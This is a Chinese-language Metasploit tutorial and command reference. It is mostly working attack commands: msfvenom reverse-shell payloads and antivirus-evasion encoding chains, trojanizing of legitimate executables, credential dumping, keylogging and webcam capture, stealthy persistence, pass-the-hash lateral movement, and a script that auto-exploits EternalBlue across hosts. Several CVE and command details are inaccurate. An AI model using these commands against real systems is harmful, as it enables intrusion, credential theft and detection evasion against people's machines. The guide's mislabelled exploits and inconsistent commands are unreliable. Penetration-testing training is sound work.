# Metasploit 使用指南

> Metasploit Framework（MSF）是最流行的渗透测试框架，集成了大量漏洞利用模块、辅助模块和 Payload，是渗透测试的利器。

---

## 目录

- [一、Metasploit 简介](#一metasploit-简介)
- [二、安装与启动](#二安装与启动)
- [三、基本架构](#三基本架构)
- [四、MSFconsole 使用](#四msfconsole-使用)
- [五、常用模块](#五常用模块)
- [六、Payload 与监听](#六payload-与监听)
- [七、Meterpreter](#七meterpreter)
- [八、后渗透操作](#八后渗透操作)
- [九、提权](#九提权)
- [十、内网穿透](#十内网穿透)
- [十一、常用命令速查](#十一常用命令速查)

---

## 一、Metasploit 简介

Metasploit 是 Rapid7 公司开发的渗透测试框架，是全球最流行的安全测试工具之一。

**版本**：
- **Community**：社区版（免费）
- **Pro**：专业版（付费，更多功能）
- **Framework**：框架（开源免费，命令行）

**主要功能**：
- 漏洞利用（Exploit）
- Payload 生成
- 后渗透攻击（Post-Exploitation）
- 社工（Social Engineering）
- 免杀（Payload 编码/加密）
- 内网渗透
- 凭证窃取

---

## 二、安装与启动

### 2.1 Kali Linux（自带）

```bash
# 启动 PostgreSQL 数据库
sudo systemctl start postgresql

# 初始化数据库
sudo msfdb init

# 启动 MSF
msfconsole
```

### 2.2 其他系统

```bash
# 下载安装
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### 2.3 启动

```bash
# 启动控制台
msfconsole

# 静默启动（不显示 banner）
msfconsole -q

# 执行命令后退出
msfconsole -x "search ms17-010"
```

### 2.4 更新

```bash
# 更新 Metasploit
msfupdate
```

---

## 三、基本架构

```
Metasploit Framework
├── Exploits     # 漏洞利用模块（利用漏洞获取权限）
├── Payloads     # 攻击载荷（漏洞利用后执行的代码）
│   ├── Singles   # 单个 Payload（独立）
│   ├── Stagers   # 传输器（建立连接）
│   └── Stages    # 传输体（Stager 下载的功能模块）
├── Auxiliary    # 辅助模块（扫描、枚举、爆破等）
├── Post         # 后渗透模块（拿到权限后的操作）
├── Encoders     # 编码模块（免杀、绕过检测）
├── Nops         # 空指令模块
└── Evasion      # 逃避模块（绕过 AV/EDR）
```

**常用 Payload 类型**：
- **bind_tcp**：正向连接（攻击机 → 目标机）
- **reverse_tcp**：反向连接（目标机 → 攻击机）
- **reverse_http/https**：HTTP/HTTPS 反向连接
- **meterpreter**：高级 Payload，功能丰富

---

## 四、MSFconsole 使用

### 4.1 界面

```
msf6 >
```

提示符中的数字是版本号（msf6 表示第 6 代）。

### 4.2 基本命令

| 命令 | 说明 |
|------|------|
| `help` / `?` | 帮助 |
| `search` | 搜索模块 |
| `use` | 使用模块 |
| `info` | 查看模块信息 |
| `show` | 显示信息（options、payloads 等） |
| `set` | 设置参数 |
| `unset` | 取消参数 |
| `setg` | 设置全局参数 |
| `unsetg` | 取消全局参数 |
| `run` / `exploit` | 运行模块 |
| `back` | 返回上一级 |
| `exit` / `quit` | 退出 |
| `banner` | 显示 banner |
| `history` | 命令历史 |

### 4.3 搜索模块

```bash
# 搜索关键字
msf6 > search ms17-010
msf6 > search eternalblue
msf6 > search mysql

# 按类型搜索
msf6 > search type:auxiliary mysql
msf6 > search type:exploit windows

# 按平台搜索
msf6 > search platform:windows smb
msf6 > search platform:linux tomcat

# 组合搜索
msf6 > search type:exploit platform:windows smb
```

**结果列说明**：
- `#` — 序号
- `Name` — 模块名称
- `Disclosure Date` — 披露日期
- `Rank` — 评级（excellent > great > good > normal > average > low）
- `Check` — 是否支持 check 命令
- `Description` — 描述

### 4.4 使用模块

```bash
# 使用模块（完整路径）
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 或用序号
msf6 > use 0

# 查看模块信息
msf6 exploit(...) > info

# 查看需要设置的参数
msf6 exploit(...) > show options

# 设置参数
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set LHOST 192.168.1.1
msf6 exploit(...) > set LPORT 4444

# 查看可用 payload
msf6 exploit(...) > show payloads

# 设置 payload
msf6 exploit(...) > set payload windows/x64/meterpreter/reverse_tcp

# 运行
msf6 exploit(...) > run
msf6 exploit(...) > exploit

# 运行并后台执行
msf6 exploit(...) > run -j
```

### 4.5 会话管理

```bash
# 查看所有会话
msf6 > sessions

# 进入指定会话
msf6 > sessions -i 1

# 后台会话（在 Meterpreter 中）
meterpreter > background

# 杀死会话
msf6 > sessions -k 1

# 升级会话（将普通 Shell 升级为 Meterpreter）
msf6 > sessions -u 1
```

---

## 五、常用模块

### 5.1 辅助模块（Auxiliary）

**扫描/枚举**：
```bash
# 端口扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# SMB 扫描
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# MS17-010 检测
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# MySQL 空密码
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.0/24
set USERNAME root
set PASSWORD ''
run

# FTP 匿名登录
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.0/24
run

# SSH 版本扫描
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run
```

### 5.2 漏洞利用模块（Exploit）

**Windows 常见漏洞**：
```bash
# MS17-010 永恒之蓝
use exploit/windows/smb/ms17_010_eternalblue

# MS08-067
use exploit/windows/smb/ms08_067_netapi

# BlueKeep (CVE-2019-0708)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

**Web 漏洞**：
```bash
# Struts2
use exploit/multi/http/struts2_namespace_ognl

# Tomcat
use exploit/multi/http/tomcat_mgr_upload

# Jenkins
use exploit/multi/http/jenkins_script_console
```

---

## 六、Payload 与监听

### 6.1 常用 Payload

**Windows**：
```
windows/meterpreter/reverse_tcp         # 32位 Meterpreter 反向 TCP
windows/x64/meterpreter/reverse_tcp     # 64位 Meterpreter 反向 TCP
windows/meterpreter/reverse_https       # 反向 HTTPS
windows/shell/reverse_tcp               # 普通 Shell
windows/shell_bind_tcp                  # 正向 Shell
```

**Linux**：
```
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp
```

**Java / 多平台**：
```
java/meterpreter/reverse_tcp
php/meterpreter/reverse_tcp
python/meterpreter/reverse_tcp
```

### 6.2 生成 Payload（msfvenom）

msfvenom 用于生成各种格式的 Payload 文件。

**基本语法**：
```bash
msfvenom -p <payload> <options> -f <format> -o <output>
```

**Windows EXE**：
```bash
# 32位
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o shell.exe

# 64位
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o shell64.exe
```

**Linux ELF**：
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf -o shell64.elf
```

**PHP Webshell**：
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o shell.php
```

**Python**：
```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o shell.py
```

**Java WAR**：
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f war -o shell.war
```

**脚本类**：
```bash
# bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.1 LPORT=4444 -f raw

# Python
msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.1 LPORT=4444 -f raw

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.1 LPORT=4444 -f raw
```

### 6.3 编码与免杀

```bash
# 列出可用编码器
msfvenom -l encoders

# 使用编码器
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# 多重编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -e x86/shikata_ga_nai -i 10 \
         -e x86/countdown -i 5 \
         -f exe -o multi_encoded.exe
```

**常用编码器**：
- `x86/shikata_ga_nai` — 多边形编码（最经典）
- `x86/fnstenv_mov` — FPU 指令
- `x86/countdown` — 倒计时
- `x86/alpha_mixed` — 字母数字混合

### 6.4 设置监听（handler）

```bash
# 开启监听
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run -j  # 后台运行

# 或简写
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run -j"
```

---

## 七、Meterpreter

Meterpreter 是 Metasploit 的高级 Payload，功能非常强大。

### 7.1 基本命令

```bash
# 帮助
meterpreter > help

# 系统信息
meterpreter > sysinfo

# 当前用户
meterpreter > getuid

# 进程列表
meterpreter > ps

# 当前进程 ID
meterpreter > getpid

# 迁移进程
meterpreter > migrate 1234
meterpreter > migrate -N explorer.exe

# 进入 Shell
meterpreter > shell

# 退出 Meterpreter
meterpreter > exit

# 后台运行
meterpreter > background
```

### 7.2 文件操作

```bash
# 查看当前目录
meterpreter > pwd

# 列出文件
meterpreter > ls

# 切换目录
meterpreter > cd C:\\

# 上传文件
meterpreter > upload /local/path C:\\remote\\path

# 下载文件
meterpreter > download C:\\remote\\path /local/path

# 查看文件内容
meterpreter > cat C:\\test.txt

# 搜索文件
meterpreter > search -f *.doc -d C:\\Users

# 创建目录
meterpreter > mkdir C:\\test

# 删除文件
meterpreter > rm C:\\test.txt
```

### 7.3 网络操作

```bash
# 查看网络配置
meterpreter > ipconfig
meterpreter > ifconfig

# 查看路由表
meterpreter > route

# 端口转发
meterpreter > portfwd add -l 3306 -p 3306 -r 192.168.1.100

# 查看 ARP 表
meterpreter > arp

# 查看网络连接
meterpreter > netstat
```

### 7.4 系统操作

```bash
# 关机
meterpreter > shutdown

# 重启
meterpreter > reboot

# 注销
meterpreter > logoff

# 挂起
meterpreter > suspend
```

---

## 八、后渗透操作

### 8.1 凭证窃取

```bash
# 加载 mimikatz
meterpreter > load kiwi

# 抓取明文密码（需要 SYSTEM 权限）
meterpreter > creds_all
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# 哈希转储
meterpreter > run post/windows/gather/hashdump

# 键盘记录
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```

### 8.2 权限提升

```bash
# 尝试 getsystem（多种提权方法自动尝试）
meterpreter > getsystem

# 查看系统信息
meterpreter > sysinfo

# 查看权限
meterpreter > getprivs

# 本地提权模块（在 MSF 中搜索）
msf6 > search type:exploit platform:windows local privilege
```

### 8.3 持久化

```bash
# 服务方式
meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.1.1

# 启动项
meterpreter > run persistence -U -i 60 -p 4444 -r 192.168.1.1

# 详细参数
meterpreter > run persistence -h
```

### 8.4 屏幕截图与摄像头

```bash
# 截图
meterpreter > screenshot

# 开启远程桌面
meterpreter > run post/windows/manage/enable_rdp

# 摄像头列表
meterpreter > webcam_list

# 拍照
meterpreter > webcam_snap

# 摄像头直播
meterpreter > webcam_stream
```

---

## 九、提权

### 9.1 Windows 提权

**方法 1：getsystem（自动尝试）**
```bash
meterpreter > getsystem
```

**方法 2：溢出漏洞提权**
```bash
# 查看系统补丁，判断可利用漏洞
meterpreter > run post/windows/gather/enum_patches

# 搜索对应 exploit
msf6 > search ms16_032
msf6 > search cve-2021-40449
```

**方法 3：错误服务配置**
```bash
# 枚举服务
meterpreter > run post/windows/gather/enum_services

# 查找可写的服务
meterpreter > run exploit/windows/local/service_permissions
```

### 9.2 Linux 提权

```bash
# 枚举系统信息
meterpreter > run post/linux/gather/enum_system

# 检查可写文件
meterpreter > run post/linux/gather/enum_configs

# 脏牛提权等
msf6 > search dirtycow
```

---

## 十、内网穿透

### 10.1 添加路由

```bash
# 查看内网网段
meterpreter > run get_local_subnets

# 在 MSF 中添加路由（让其他模块也能访问内网）
msf6 > route add 192.168.10.0 255.255.255.0 1
# 网段         子网掩码        会话ID

# 查看路由
msf6 > route print

# 删除路由
msf6 > route del 192.168.10.0 255.255.255.0
```

### 10.2 端口转发

```bash
# 转发本地端口到内网机器
meterpreter > portfwd add -l 3306 -p 3306 -r 192.168.10.100
#              本地端口   远程端口    远程主机

# 查看转发列表
meterpreter > portfwd list

# 删除转发
meterpreter > portfwd delete -l 3306
```

### 10.3 SOCKS 代理

```bash
# 使用 MSF 自带 socks 模块
use auxiliary/server/socks_proxy
set SRVHOST 0.0.0.0
set SRVPORT 1080
set VERSION 5
run -j

# 然后在本地配置代理使用
# 浏览器/工具设置 SOCKS5 代理 127.0.0.1:1080
```

### 10.4 内网扫描

```bash
# 添加路由后，可以直接使用 MSF 模块扫描内网
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.10.0/24
set PORTS 22,80,445,3306
set THREADS 20
run
```

---

## 十一、常用命令速查

### 11.1 MSF 常用命令

```bash
# 搜索模块
search <keyword>

# 使用模块
use <module_path>

# 查看选项
show options

# 设置参数
set RHOSTS 192.168.1.100
set LHOST 192.168.1.1
set LPORT 4444

# 设置 payload
set payload windows/x64/meterpreter/reverse_tcp

# 运行
run
exploit
run -j   # 后台

# 会话管理
sessions
sessions -i 1
sessions -k 1
```

### 11.2 Meterpreter 常用命令

```bash
# 系统
sysinfo
getuid
getpid
ps

# 进程迁移
migrate <pid>
migrate -N explorer.exe

# 文件
ls
cd
pwd
upload /local /remote
download /remote /local
cat file
search -f *.txt -d /path

# 网络
ipconfig
route
arp
netstat
portfwd add -l 3306 -p 3306 -r target

# 提权
getsystem
getprivs

# 凭证
load kiwi
creds_all
hashdump

# 其他
screenshot
keyscan_start
keyscan_dump
shell
background
exit
```

### 11.3 msfvenom 常用命令

```bash
# Windows EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# Windows 64位
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell64.exe

# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

# 编码
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

---

> ⚠️ **安全提示**：Metasploit 是强大的渗透测试工具，仅可用于授权测试。未经授权使用属于违法行为。

> **延伸学习**：Metasploit 功能非常庞大，建议先掌握基本的 exploit/multi/handler 和 Meterpreter 操作，然后逐步学习各种漏洞模块和后渗透技巧。

---

## 十二、Meterpreter 高级技术

### 12.1 进程注入与迁移

在实际渗透中，进程迁移是维持持久会话和规避检测的关键技术。

```bash
# 查看所有进程，重点关注 explorer.exe、svchost.exe 等稳定进程
meterpreter > ps -S explorer

# 迁移到 explorer.exe（用户级进程，稳定且不引起怀疑）
meterpreter > migrate -N explorer.exe

# 迁移到特定 PID
meterpreter > migrate 4892

# 注入到另一个进程的内存空间（不创建新线程）
meterpreter > migrate -P 4892 -t 0

# 迁移到 LSASS 进程（需要 SYSTEM 权限，可获取更多凭证）
meterpreter > migrate -N lsass.exe
```

**进程迁移策略**：

| 场景 | 目标进程 | 原因 |
|------|---------|------|
| 维持会话稳定 | explorer.exe | 用户级进程，随登录持久运行 |
| 获取凭证 | lsass.exe | 可直接访问内存中的明文密码和哈希 |
| 隐蔽驻留 | svchost.exe | 系统服务进程，不易被怀疑 |
| 32/64位匹配 | 根据payload架构选择 | 架构不匹配会导致迁移失败 |

### 12.2 令牌操作与权限模拟

```bash
# 列出可用令牌
meterpreter > use incognito
meterpreter > list_tokens -u

# 模拟管理员令牌
meterpreter > impersonate_token DOMAIN\\Administrator

# 获取 delegation 令牌（可离线使用）
meterpreter > steal_token 4892

# 恢复原始令牌
meterpreter > rev2self
```

**令牌类型说明**：

```
Delegation Token（委派令牌）：
  - 交互式登录获得（本地登录、RDP）
  - 可用于离线认证
  - 类似于"长期通行证"

Impersonation Token（模拟令牌）：
  - 网络登录获得（SMB、WinRM）
  - 仅在当前会话有效
  - 类似于"临时通行证"
```

### 12.3 内网信息收集

```bash
# 枚举域内信息
meterpreter > run post/windows/gather/enum_domain
# 输出：域名、域控、功能级别、信任关系

# 枚举域用户
meterpreter > run post/windows/gather/enum_domain_users

# 枚举域管组
meterpreter > run post/windows/gather/enum_domain_group_members GROUP="Domain Admins"

# 枚举本地用户和组
meterpreter > run post/windows/gather/enum_localusers

# 查找域控
meterpreter > run post/windows/gather/enum_domain_groups

# 枚举已安装软件
meterpreter > run post/windows/gather/enum_applications

# 检查 AV/EDR
meterpreter > run post/windows/gather/enum_av
# 输出示例：
# ====== Defender ======
# Real-time protection: Enabled
# AntivirusEnabled: true
# AntispywareEnabled: true

# 枚举服务详情
meterpreter > run post/windows/gather/enum_services -rpc

# 收集环境变量
meterpreter > run post/windows/gather/enum_env
```

### 12.4 数据包嗅探

```bash
# 加载 sniffer 模块
meterpreter > use sniffer

# 查看可用网卡
meterpreter > sniffer_interfaces

# 开始嗅探（interface 1 为第一块网卡）
meterpreter > sniffer_start 1

# 查看嗅探统计
meterpreter > sniffer_stats 1

# 导出 pcap 文件
meterpreter > sniffer_dump 1 /tmp/capture.pcap

# 停止嗅探
meterpreter > sniffer_stop 1
```

---

## 十三、后渗透模块详解

### 13.1 信息收集模块

```bash
# 收集所有有用信息（综合脚本）
meterpreter > run post/windows/gather/credentials/credential_collector

# 收集浏览器凭证
meterpreter > run post/windows/gather/credentials/credential_collector
meterpreter > run post/multi/gather/firefox_creds
meterpreter > run post/windows/gather/credentials/chocolatey

# Chrome 密码
meterpreter > run post/windows/gather/credentials/chrome

# 获取 WiFi 密码
meterpreter > run post/windows/gather/wifi_passwords

# 收集 Skype 信息
meterpreter > run post/windows/gather/credentials/skype

# 提取 Outlook 凭证
meterpreter > run post/windows/gather/credentials/outlook

# 从注册表提取 VNC 凭证
meterpreter > run post/windows/gather/credentials/vnc

# 收集 FileZilla 凭证
meterpreter > run post/windows/gather/credentials/filezilla_server

# 提取 SVN 凭证
meterpreter > run post/windows/gather/credentials/svn

# 提取 SniffIE 凭证
meterpreter > run post/multi/gather/ssh_creds
```

### 13.2 持久化模块

```bash
# 方法1：注册表持久化（需要 SYSTEM 权限）
meterpreter > run post/windows/manage/persistence_exe
  -r <LHOST> -p <LPORT> -e windows/meterpreter/reverse_tcp

# 方法2：计划任务持久化
meterpreter > run post/windows/manage/schtask
  -u <hourly|daily|weekly> -t <time>
  -c "powershell -enc <base64_payload>"

# 方法3：WMI 事件订阅持久化（隐蔽）
meterpreter > run post/windows/manage/wmi_event_filter
  -c "powershell -enc <base64>"

# 方法4：DLL 劫持持久化
meterpreter > run post/windows/manage/dll_hijack
  -d C:\\Windows\\System32\\target.dll

# 方法5：启动项持久化
meterpreter > run post/windows/manage/startup_options
  -e "C:\\Users\\Public\\payload.exe"

# 查看持久化模块列表
msf6 > search type:post platform:windows persistence
```

**持久化技术对比**：

| 技术 | 隐蔽性 | 持久性 | 检测难度 | 适用场景 |
|------|--------|--------|---------|---------|
| 注册表自启 | 低 | 中 | 易检测 | 快速持久化 |
| 计划任务 | 中 | 高 | 中等 | 定时回连 |
| WMI 事件 | 高 | 高 | 难检测 | 长期驻留 |
| DLL 劫持 | 高 | 高 | 难检测 | 绕过 EDR |
| 启动项 | 低 | 高 | 易检测 | 传统方式 |
| 服务安装 | 中 | 高 | 中等 | 系统级持久化 |

### 13.3 内网横向移动模块

```bash
# SMB 传递哈希（Pass the Hash）
use exploit/windows/smb/psexec
set RHOSTS 192.168.10.50
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.10.1
run

# WMI 横向移动
use exploit/windows/local/wmi
set RHOSTS 192.168.10.50
set SMBDomain CORP
set SMBUser svc_account
set SMBPass P@ssw0rd!
run

# WinRM 横向移动
use exploit/windows/winrm/winrm_login
set RHOSTS 192.168.10.50
set USERNAME administrator
set PASSWORD P@ssw0rd!
run

# PsExec 模块（通过 SMB 上传可执行文件并创建服务）
use exploit/windows/smb/psexec_psh
set RHOSTS 192.168.10.50
set SMBUser admin
set SMBPass password123
run
```

### 13.4 权限提升模块

```bash
# Windows 本地提权模块列表
msf6 > search type:exploit platform:windows local

# 常见提权漏洞模块：
# MS16-032 - 次级登录句柄提权
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
run

# MS16-016 - WebDAV 提权
use exploit/windows/local/ms16_016_webdav
set SESSION 1
run

# CVE-2021-40449 - Print Spoofer
use exploit/windows/local/cve_2021_40449_printnightmare
set SESSION 1
run

# CVE-2022-21907 - HTTP 协议栈提权
use exploit/windows/local/cve_2022_21907_http_protocol_stack
set SESSION 1
run

# AlwaysInstallElevated 提权
use exploit/windows/local/always_install_elevated
set SESSION 1
run

# 服务路径提权（未引用服务路径）
use exploit/windows/local/trusted_service_path
set SESSION 1
run

# Bypass UAC 模块
msf6 > search type:exploit platform:windows bypass_uac
use exploit/windows/local/bypassuac_comhijack
set SESSION 1
run
```

---

## 十四、自定义 Payload 生成

### 14.1 高级 msfvenom 技巧

```bash
# 生成带自定义模板的 EXE（使用合法软件作为模板）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -x /path/to/legitimate_app.exe \
         -k \
         -f exe -o trojanized.exe

# 使用自定义证书签名
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f psh-cmd \
         -o payload.ps1

# 生成 C# 格式 payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f csharp -o payload.cs

# 生成 PowerShell Base64 编码 payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f psh-net \
         -o payload.ps1

# 生成 Ruby 格式
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f ruby -o payload.rb

# 使用 x86/alpha_mixed 生成纯字母数字 shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -e x86/alpha_mixed \
         -f c -o shellcode.c

# 生成无阶段 payload（Stageless，体积大但减少网络特征）
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -f exe -o stageless.exe
```

### 14.2 Payload 格式说明

| 格式 | 说明 | 使用场景 |
|------|------|---------|
| `exe` | Windows 可执行文件 | 直接运行 |
| `dll` | 动态链接库 | DLL 注入、DLL 劫持 |
| `vba` | Office 宏代码 | 钓鱼文档 |
| `hta-psh` | HTA + PowerShell | 钓鱼页面 |
| `psh-cmd` | PowerShell 命令 | 内存执行 |
| `psh-net` | .NET 程序集 | 内存注入 |
| `raw` | 原始 shellcode | 嵌入到自定义加载器 |
| `csharp` | C# 代码 | 编译后执行 |
| `python` | Python 脚本 | 跨平台执行 |
| `vbs` | VBScript | 脚本执行 |
| `war` | Web 归档 | 部署到 Java Web 服务器 |
| `elf` | Linux 可执行文件 | Linux 目标 |
| `macho` | macOS 可执行文件 | macOS 目标 |

### 14.3 自定义编码链

```bash
# 多重编码链（提升免杀效果）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -e x86/shikata_ga_nai -i 3 \
         -e x86/countdown -i 3 \
         -e x86/xor_dynamic -i 3 \
         -f exe -o multi_encoded.exe

# 使用 NOP 生成器（插入随机 NOP 指令）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -n 20 \
         -f exe -o with_nops.exe

# 设置 Bad Characters（避免特定字节）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         -b '\x00\x0a\x0d\xff' \
         -f exe -o no_badchars.exe

# 指定平台和架构
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 \
         --platform windows -a x64 \
         -f exe -o x64_shell.exe
```

### 14.4 Payload 类型详解

```
Staged（分阶段 Payload）：
  ├── Stage 0（Stager）：小型 shellcode，负责建立连接并下载第二阶段
  ├── Stage 1（Stage）：完整 payload，通过 Stager 下载并执行
  └── 示例：windows/meterpreter/reverse_tcp

  优点：体积小，适合注入空间有限场景
  缺点：需要二次网络连接，可能被防火墙检测

Stageless（无阶段 Payload）：
  ├── 完整 payload 在一个文件中，不需要二次下载
  └── 示例：windows/meterpreter_reverse_tcp

  优点：减少网络特征，避免二次连接被检测
  缺点：体积大

Bind（绑定型）：
  ├── 目标机主动监听端口，攻击机连接
  └── 适用场景：目标机能出站但有防火墙限制入站

Reverse（反向型）：
  ├── 目标机主动连接攻击机
  └── 适用场景：目标机有出站网络权限

Meterpreter vs Shell：
  ├── Meterpreter：功能丰富（文件操作、提权、内网穿透等）
  └── Shell：功能简单，仅命令行交互
```

---

## 十五、数据库操作

### 15.1 Metasploit 数据库配置

```bash
# 初始化数据库
msf6 > db_init

# 查看数据库状态
msf6 > db_status
# 输出：[*] Connected to msf_database. Connection type: postgresql.

# 连接 PostgreSQL 数据库
msf6 > db_connect msf:password@127.0.0.1:5432/msf_database

# 断开数据库
msf6 > db_disconnect

# 重建数据库（清空所有数据）
msf6 > db_rebuild
```

### 15.2 主机管理

```bash
# 手动添加主机
msf6 > hosts add 192.168.1.10 os_name Windows os_flavor 10
msf6 > hosts add 192.168.1.20 os_name Linux os_flavor Ubuntu

# 查看所有主机
msf6 > hosts

# 按条件过滤
msf6 > hosts 192.168.1.0/24
msf6 > hosts -S Windows

# 查看主机详情
msf6 > hosts -d 192.168.1.10

# 删除主机
msf6 > hosts -d 192.168.1.20
```

### 15.3 服务管理

```bash
# 查看所有服务
msf6 > services

# 按端口过滤
msf6 > services -p 445

# 按主机过滤
msf6 > services 192.168.1.10

# 按服务名过滤
msf6 > services -S smb

# 添加自定义服务记录
msf6 > services add 192.168.1.10 8080 http "Tomcat 9.0.30"
```

### 15.4 凭证管理

```bash
# 查看所有凭证
msf6 > creds

# 按类型过滤
msf6 > creds -t Password
msf6 > creds -t NTLM hash

# 添加凭证
msf6 > creds add user:admin password:P@ssw0rd realm:CORP

# 导入凭证文件
msf6 > creds import /tmp/hashes.txt
```

### 15.5 扫描结果导入导出

```bash
# 导入 Nmap XML 扫描结果
msf6 > db_import /tmp/nmap_scan.xml

# 导出数据
msf6 > db_export -f xml /tmp/msf_export.xml

# 自动化扫描并存储结果
msf6 > workspace -d corp_network_scan
msf6 > db_nmap -sS -sV -O 192.168.1.0/24
# 扫描结果自动保存到数据库

# 工作区管理
msf6 > workspace -a new_project      # 添加工作区
msf6 > workspace -d old_project     # 删除工作区
msf6 > workspace corp_network       # 切换工作区
```

---

## 十六、Resource 脚本自动化

### 16.1 Resource 脚本基础

Resource 脚本（.rc 文件）可以自动化 Metasploit 操作，适合批量任务和重复工作流。

```bash
# 创建 resource 脚本文件 auto_exploit.rc
cat > auto_exploit.rc << 'EOF'
# 设置全局变量
setg LHOST 192.168.1.1
setg LPORT 4444
setg RHOSTS 192.168.1.100

# 启动监听
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.1
set LPORT 4444
run -j

# 使用漏洞利用模块
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
run
EOF

# 执行 resource 脚本
msf6 > resource auto_exploit.rc

# 命令行直接执行
msfconsole -r auto_exploit.rc
```

### 16.2 自动化扫描脚本

```bash
# auto_scan.rc — 自动化内网扫描脚本
cat > auto_scan.rc << 'EOF'
# 创建工作区
workspace -a internal_scan

# 导入已有扫描结果
db_import /tmp/nmap_full_scan.xml

# 端口扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.10.0/24
set PORTS 21,22,80,135,139,443,445,1433,3306,3389,5985,8080
set THREADS 50
run

# SMB 版本扫描
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.10.0/24
set THREADS 50
run

# SSH 版本扫描
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.10.0/24
set THREADS 50
run

# Web 服务识别
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.10.0/24
set THREADS 50
run

# MySQL 空密码检测
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.10.0/24
set USERNAME root
set PASSWORD ""
set THREADS 20
run

# 输出扫描摘要
workspace internal_scan
hosts
services
creds
EOF

msf6 > resource auto_scan.rc
```

### 16.3 自动化漏洞利用脚本

```bash
# auto_pwn.rc — 批量漏洞利用
cat > auto_pwn.rc << 'EOF'
<ruby>
# 使用 Ruby 资源脚本进行条件判断
# 读取数据库中的主机和服务信息
framework.db.hosts.each do |host|
  host.services.each do |service|
    if service.port == 445 and service.state == Msf::HostServiceState::Open
      print_status("Found SMB on #{host.address}")
      # 自动执行 EternalBlue
      mod = framework.modules.create('exploit/windows/smb/ms17_010_eternalblue')
      mod.datastore['RHOSTS'] = host.address
      mod.datastore['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
      mod.datastore['LHOST'] = '192.168.1.1'
      mod.datastore['LPORT'] = '4444'
      mod.execute_simple
      sleep(10)
    end
  end
end
</ruby>
EOF

